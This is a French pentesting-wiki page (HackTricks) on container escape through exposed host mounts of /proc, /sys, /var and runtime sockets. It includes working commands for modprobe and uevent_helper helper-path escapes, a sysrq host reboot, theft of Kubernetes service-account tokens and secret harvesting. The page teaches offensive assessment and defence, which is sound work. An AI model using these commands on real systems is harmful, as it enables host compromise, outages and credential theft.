# Points de montage sensibles de l'hôte

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Les points de montage de l'hôte sont l'une des surfaces d'évasion de conteneur les plus importantes en pratique, car ils font souvent passer une vue de processus soigneusement isolée à une visibilité directe des ressources de l'hôte. Les cas dangereux ne se limitent pas à `/`.

Les bind mounts de `/proc`, `/sys`, `/var`, les sockets runtime, l'état géré par kubelet ou les chemins liés aux périphériques peuvent exposer des contrôles du noyau, des identifiants, les systèmes de fichiers des conteneurs voisins et des interfaces de gestion runtime.

Cette page existe séparément des pages de protection individuelles car le modèle d'abus est transversal. Un point de montage d'hôte en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin hôte exact exposé. L'aborder comme un sujet à part rend la surface d'attaque beaucoup plus facile à analyser.

## Exposition de `/proc`

procfs contient à la fois des informations process ordinaires et des interfaces de contrôle du noyau à fort impact. Un bind mount tel que `-v /proc:/host/proc` ou une vue de container qui expose des entrées proc inattendues modifiables en écriture peut donc mener à une divulgation d'informations, un déni de service, ou une exécution de code directe sur l'hôte.

Chemins procfs à haute valeur :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abus

Commencez par vérifier quelles entrées procfs à haute valeur sont visibles ou modifiables en écriture :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour des raisons différentes. `core_pattern`, `modprobe`, et `binfmt_misc` peuvent devenir des vecteurs d'exécution de code sur l'hôte lorsqu'ils sont accessibles en écriture. `kallsyms`, `kmsg`, `kcore`, et `config.gz` sont de puissantes sources de reconnaissance pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstruire la topologie de l'hôte depuis l'intérieur du conteneur.

La valeur pratique de chaque chemin diffère, et les traiter tous comme s'ils avaient le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
Si accessible en écriture, il s'agit de l'un des chemins procfs à plus fort impact parce que le kernel exécutera un pipe handler après un crash. Un conteneur capable de pointer `core_pattern` vers une charge utile stockée dans son overlay ou dans un chemin monté depuis l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle l'helper userspace utilisé par le kernel lorsqu'il doit invoquer la logique de chargement de modules. S'il est accessible en écriture depuis le conteneur et interprété dans le contexte de l'hôte, il peut devenir un autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin de l'helper.
- `/proc/sys/vm/panic_on_oom`
Ce n'est généralement pas un primitive d'évasion propre, mais il peut convertir la pression mémoire en déni de service à l'échelle de l'hôte en transformant les conditions OOM en comportement de panic du kernel.
- `/proc/sys/fs/binfmt_misc`
Si l'interface d'enregistrement est accessible en écriture, l'attaquant peut enregistrer un handler pour une valeur magic choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage d'exploits du kernel. Il permet de déterminer quels sous-systèmes, quelles atténuations et quelles fonctionnalités optionnelles du kernel sont activés sans avoir besoin des métadonnées des paquets de l'hôte.
- `/proc/sysrq-trigger`
Majoritairement un chemin de déni de service, mais très sérieux. Il peut redémarrer, provoquer un panic ou autrement perturber immédiatement l'hôte.
- `/proc/kmsg`
Reveal kernel ring buffer messages. Utile pour le fingerprinting de l'hôte, l'analyse de crash, et dans certains environnements pour leaking information utile à l'exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible car il expose les informations sur les symboles exportés du kernel et peut aider à contrecarrer les hypothèses d'address randomization lors du développement d'exploits du kernel.
- `/proc/[pid]/mem`
Il s'agit d'une interface directe vers la mémoire d'un processus. Si le processus cible est atteignable avec les conditions nécessaires de type ptrace, cela peut permettre de lire ou modifier la mémoire d'un autre processus. L'impact réaliste dépend fortement des identifiants, de `hidepid`, de Yama et des restrictions ptrace, c'est donc un chemin puissant mais conditionnel.
- `/proc/kcore`
Expose une vue de type core-image de la mémoire système. Le fichier est énorme et peu pratique, mais s'il est lisible de manière significative cela indique une surface mémoire de l'hôte mal exposée.
- `/proc/kmem` and `/proc/mem`
Historiquement des interfaces mémoire brute à fort impact. Sur de nombreux systèmes modernes elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables elles doivent être considérées comme des découvertes critiques.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extrêmement utile pour reconstruire où le conteneur se trouve réellement sur l'hôte, quels chemins sont backing par overlay, et si un mount inscriptible correspond à du contenu hôte ou uniquement à la couche du conteneur.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles car un certain nombre d'astuces d'exécution sur l'hôte nécessitent de transformer un chemin à l'intérieur du conteneur en le chemin correspondant du point de vue de l'hôte.

### Exemple complet : Abus du helper path de `modprobe`

Si `/proc/sys/kernel/modprobe` est inscriptible depuis le conteneur et que le helper path est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, mais l'important est qu'un writable helper path peut rediriger une future invocation du kernel helper vers du contenu host-path contrôlé par l'attaquant.

### Exemple complet : Kernel Recon avec `kallsyms`, `kmsg`, et `config.gz`

Si l'objectif est une évaluation de l'exploitabilité plutôt que l'échappement immédiat :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à déterminer si des informations de symboles utiles sont visibles, si des messages récents du kernel révèlent un état intéressant, et quelles kernel features ou mitigations sont compilées. L'impact n'est généralement pas un escape direct, mais cela peut fortement raccourcir le kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la host view:
```bash
echo b > /proc/sysrq-trigger
```
L'effet est un redémarrage immédiat de l'hôte. Ce n'est pas un exemple subtil, mais il montre clairement que l'exposition de procfs peut être bien plus grave qu'une simple divulgation d'informations.

## `/sys` Exposition

sysfs expose de grandes quantités d'état du kernel et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d'autres peuvent affecter l'exécution d'helpers, le comportement des périphériques, la configuration des security modules, ou l'état du firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de gestion thermique et donc la stabilité de l'hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des crash-dump et des informations sur l'agencement du kernel qui aident au fingerprinting de l'hôte à bas niveau. `/sys/kernel/security` est l'interface `securityfs` utilisée par Linux Security Modules, donc un accès inattendu peut exposer ou altérer l'état lié au MAC. Les chemins de variables EFI peuvent affecter les paramètres de démarrage pris en charge par le firmware, les rendant bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s'agit intentionnellement d'une interface orientée développeur avec beaucoup moins d'attentes de sécurité que les API kernel durcies et destinées à la production.

Les commandes utiles pour examiner ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` peut révéler si AppArmor, SELinux, ou une autre surface LSM est visible d'une manière qui aurait dû rester limitée à l'hôte.
- `/sys/kernel/debug` est souvent la découverte la plus alarmante de ce groupe. Si `debugfs` est monté et lisible ou inscriptible, attendez-vous à une vaste surface orientée kernel dont le risque exact dépend des nœuds de debug activés.
- L'exposition des variables EFI est moins courante, mais si elle est présente l'impact est important car elle touche des paramètres pris en charge par le firmware plutôt que des fichiers d'exécution ordinaires.
- `/sys/class/thermal` est principalement pertinent pour la stabilité de l'hôte et l'interaction matérielle, pas pour une échappée de shell élégante.
- `/sys/kernel/vmcoreinfo` est principalement une source pour host-fingerprinting et crash-analysis, utile pour comprendre l'état bas-niveau du noyau.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` est inscriptible, le noyau peut exécuter un helper contrôlé par l'attaquant lorsqu'un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du conteneur actuel.

## Exposition de `/var`

Monter le `/var` de l'hôte dans un conteneur est souvent sous-estimé car cela ne semble pas aussi spectaculaire que de monter `/`. En pratique, cela peut suffire à atteindre les runtime sockets, les répertoires de snapshot des containers, les volumes de pod gérés par kubelet, les projected service-account tokens, et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l'endroit où réside l'état de container le plus intéressant d'un point de vue opérationnel.

### Exemple Kubernetes

Un pod avec `hostPath: /var` peut souvent lire les projected tokens des autres pods et le contenu des snapshots overlay :
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles car elles permettent de déterminer si le mount n'expose que des données d'application anodines ou des cluster credentials à fort impact. Un service-account token lisible peut immédiatement transformer une local code execution en accès au Kubernetes API.

Si le token est présent, validez ce qu'il peut atteindre au lieu de vous arrêter à la token discovery :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impact ici peut être bien plus important que l'accès local au nœud. Un token avec des autorisations RBAC étendues peut transformer un `/var` monté en compromission à l'échelle du cluster.

### Docker et containerd Exemple

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nœuds Kubernetes basés sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le répertoire monté `/var` expose le contenu inscriptible d'un snapshot d'une autre charge de travail, l'attaquant peut être en mesure de modifier des fichiers d'application, déposer du contenu web ou modifier des scripts de démarrage sans toucher à la configuration actuelle du conteneur.

Idées concrètes d'abus une fois qu'un contenu de snapshot inscriptible est trouvé :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ces commandes sont utiles car elles montrent les trois principales familles d'impact d'un montage de `/var` : application tampering, secret recovery et lateral movement into neighboring workloads.

## Sockets d'exécution

Les montages sensibles depuis l'hôte incluent souvent des sockets d'exécution plutôt que des répertoires complets. Ceux-ci sont tellement importants qu'ils méritent d'être répétés explicitement ici :
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consultez [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flux d'exploitation complets une fois que l'un de ces sockets est monté.

Comme premier schéma d'interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l'une d'elles réussit, le chemin du "mounted socket" au "start a more privileged sibling container" est généralement bien plus court que n'importe quel chemin d'évasion du kernel.

## CVE liées aux montages

Les montages hôtes croisent aussi les vulnérabilités d'exécution. Des exemples récents importants incluent :

- `CVE-2024-21626` in `runc`, où un leaked directory file descriptor pourrait placer le répertoire de travail sur le système de fichiers hôte.
- `CVE-2024-23651` et `CVE-2024-23653` in BuildKit, où des races de copy-up d'OverlayFS pourraient produire des écritures sur des chemins hôtes pendant les builds.
- `CVE-2024-1753` in Buildah and Podman build flows, où des bind mounts fabriqués pendant la construction pourraient exposer `/` en lecture-écriture.
- `CVE-2024-40635` in containerd, où une valeur `User` trop grande pourrait déborder pour provoquer un comportement équivalent à l'UID 0.

Ces CVE sont importantes ici parce qu'elles montrent que la gestion des montages ne dépend pas uniquement de la configuration de l'opérateur. Le runtime lui-même peut aussi introduire des conditions d'évasion liées aux montages.

## Vérifications

Utilisez ces commandes pour localiser rapidement les expositions de montages les plus critiques :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- La racine de l'hôte, `/proc`, `/sys`, `/var`, et les sockets d'exécution sont tous des découvertes à haute priorité.
- Les entrées proc/sys modifiables en écriture signifient souvent que le montage expose des contrôles du noyau à l'échelle de l'hôte plutôt qu'une vue sécurisée du conteneur.
- Les chemins montés `/var` méritent un examen des identifiants et des charges de travail voisines, pas seulement un examen du système de fichiers.
